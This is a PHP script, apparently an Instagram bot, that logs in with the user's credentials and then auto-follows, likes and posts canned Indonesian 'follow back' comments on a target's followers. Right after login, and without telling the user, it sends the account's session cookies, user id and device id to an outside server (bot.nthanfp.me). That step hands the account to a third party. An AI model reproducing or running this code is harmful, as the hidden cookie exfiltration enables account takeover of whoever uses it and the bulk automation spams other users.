<?php
require('../func.php');
require('../ass.php');
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
echo $cyan;
echo banner();
sleep(1);
echo banner1();
echo banner2();
sleep(1);
echo $normal;
echo "[?] Input your instagram username : ";
$userig    = trim(fgets(STDIN, 1024));
echo "[?] Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo "".$green."[+] Login Success....".$normal."\n";
    echo "".$green."[+] Please Wait".$normal."\n";
    sleep(1);
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig = json_decode(req('https://bot.nthanfp.me/action/api().php', $data));
    //start
    echo "[?] Input Target : ";
    $target = trim(fgets(STDIN, 1024));
    echo "[?] Input Type \n1) Followers\n2) Following\nJust Input Number : ";
    $tipex  = trim(fgets(STDIN, 1024));
    $jumlah = 10;
    echo "[?] Input Delay (in seconds) : ";
    $delay = trim(fgets(STDIN, 1024));
    $iyh   = true;
    do {
        echo "".$yellow."[!] Please Wait....".$normal."\n";
        // end
        // start
        $idtarget = getuid($target);
        $getinfo  = proccess(1, $useragent, 'users/' . $idtarget . '/info/', $cookie);
        $getinfo  = json_decode($getinfo[1]);
        if($tipex):
            $tipenya = 'followers';
        else:
            $tipenya = 'following';
        endif;
        if($tipenya == 'followers'):
            if(!is_numeric($jumlah))
                $limit = 1;
            elseif($jumlah > ($getinfo->user->follower_count - 1))
                $limit = $getinfo->user->follower_count - 1;
            else
                $limit = $jumlah - 1;
            $tipe = 'followers';
        else:
            if(!is_numeric($jumlah))
                $limit = 1;
            elseif($jumlah > ($getinfo->user->following_count - 1))
                $limit = $getinfo->user->following_count - 1;
            else
                $limit = $jumlah - 1;
            $tipe = 'following';
        endif;
        $c       = 0;
        $listids = array();
        do {
            $parameters = ($c > 0) ? '?max_id=' . $c : '';
            $req        = proccess(1, $useragent, 'friendships/' . $idtarget . '/' . $tipe . '/' . $parameters, $cookie);
            $req        = json_decode($req[1]);
            for($i = 0; $i < count($req->users); $i++):
                if(count($listids) <= $limit)
                    $listids[count($listids)] = $req->users[$i]->pk;
            endfor;
            $c = (isset($req->next_max_id)) ? $req->next_max_id : 0;
        } while(count($listids) <= $limit);
        for($i = 0; $i < count($listids); $i++):
        	//user details
        	$date = date("Y-m-d H:i:s");
            $getx = proccess(1, $useragent, 'users/' . $listids[$i] . '/info/', $cookie);
            $getx = json_decode($getx[1]);
            $priv = $getx->user->is_private;
            if($priv == 1):
                echo "".$red."[x] ".$date." | @".$req->users[$i]->username." User Private, Skiped...\n";
            else:
                //follow user
                $follow = proccess(1, $useragent, 'friendships/create/' . $listids[$i] . '/', $cookie, hook('{"user_id":"' . $listids[$i] . '"}'));
                $follow = json_decode($follow[1]);
                if($follow->status == 'ok'):
                    $follow_status = "".$green."Success follow".$normal."";
                else:
                    $follow_status = "".$red."Failed follow".$normal."";
                endif;
                //get new media user
                $getmedia = proccess(1, $useragent, 'feed/user/' . $listids[$i] . '/', $cookie);
                $getmedia = json_decode($getmedia[1], true);
                $mediaId  = $getmedia['items'][0]['id'];
                //like media
                $like     = proccess(1, $useragent, 'media/' . $mediaId . '/like/', $cookie, hook('{"media_id":"'.$mediaId.'"}'), array(
                    'Accept-Language: id-ID, en-US',
                    'X-IG-Connection-Type: WIFI'
                ));
                $like     = json_decode($like[1]);
                if($like->status == 'ok'):
                    $like_status = "".$green."Liked".$normal."";
                else:
                    $like_status = "".$red."Failed Like".$normal."";
                endif;
                //comment media
                $listKomentar = array("Like back dan Follow back ya🙏", "follback dan like back🙏", "follback ya👌", "salken", " follback dan like back ya👍", "salam kenal follback dan likeback ya kak👍", "orang mana? follback dan likeback ya👍", "salken ya", " boleh minta follback dan likeback?", "follback yo", "follbackk", "followback ya", "udah aku follow dan like bisa minta follback dan likeback gak hehe", "follback dan likeback yo kak udah difollow kok", "follback dan likeback kak sudah aku follow dan like", "bisa minta follow back kak hehe?", "followback yo 😀", "salken", " follback ya 🙂 ", "salken", " follback aku yah", "salken", " btw follback ya", "salken", " follback juga yah hehe", "salamkenal", " follback yah hehe", "bisa follback ?", "follback yow", "follback yapp", "Follback hihihihi", "follbackk saya ya 🙂", "Orang mana kak", " like back dan Follback ya", "Salam kenal kak hehe likeback dan follback ya", "Salkus ya kak like back dan follback ya", "Mari berteman kak", "like back dan follback ya", "Orang mana kak", " Salam kenal ya tod ", " likeback dan Follback yaa", "Orang mana kak?", " likeback dan Follback dong", "Namanya siapa", " Salam kenal ya", " like back dan follback ya", "Saling follback ya kak", " makasih", "Orang mana kak", " likeback dan Follbackdong hehehe", "halo  kak salken ya", "", " like back dan Follback ya", "Mari berteman ya kak saling dan follback hehe", "Kenalan dong kak heheh likeback dan follback ya", "Likeback dan follback hihi salam kenal ya", "Hallo kak salam kenal ya hehe likeback dan follback juga ya");
                $commentAcak  = $listKomentar[rand(0, count($listKomentar) - 1)];
                $comment      = proccess(1, $useragent, 'media/'.$mediaId.'/comment/', $cookie, hook('{"comment_text":"'.$commentAcak.'"}'));
                $comment      = json_decode($comment[1]);
                if($comment->status == 'ok'):
                    $comment_status = $green;
                else:
                    $comment_status = $red;
                endif;
                echo "[+] ".$date." | ".$follow_status." @".$req->users[$i]->username." | ".$like_status." ".$mediaId." | ".$comment_status."".$commentAcak."".$normal." \n";
                sleep($delay);
            endif;
        endfor;
    } while($iyh == 'false');
}
?>
